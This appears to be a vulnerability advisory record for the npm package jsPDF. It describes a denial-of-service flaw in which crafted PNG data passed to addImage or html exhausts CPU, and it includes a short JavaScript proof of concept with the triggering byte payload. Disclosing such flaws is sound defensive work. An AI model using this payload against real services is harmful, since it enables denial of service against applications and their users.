package_slug: "npm/jspdf"
title: "jsPDF Denial of Service (DoS)"
description: "User control of the first argument of the addImage method results in
  CPU utilization and denial of service.\n\nIf given the possibility to pass unsanitized
  image data or URLs to the addImage method, a user can provide a harmful PNG file
  that results in high CPU utilization and denial of service.\n\nOther affected methods
  are: `html`.\n\nExample payload:\n\n```js\nimport { jsPDF } from \"jspdf\"\n\nconst
  payload = new Uint8Array([117, 171, 90, 253, 166, 154, 105, 166, 154])\n\nconst
  doc = new jsPDF();\nconst startTime = performance.now();\ntry {\ndoc.addImage(payload,
  \"PNG\", 10, 40, 180, 180, undefined, \"SLOW\");\n} finally {\nconst endTime = performance.now();\nconsole.log(`Call
  to doc.addImage took ${endTime - startTime} milliseconds`);\n}\n```"
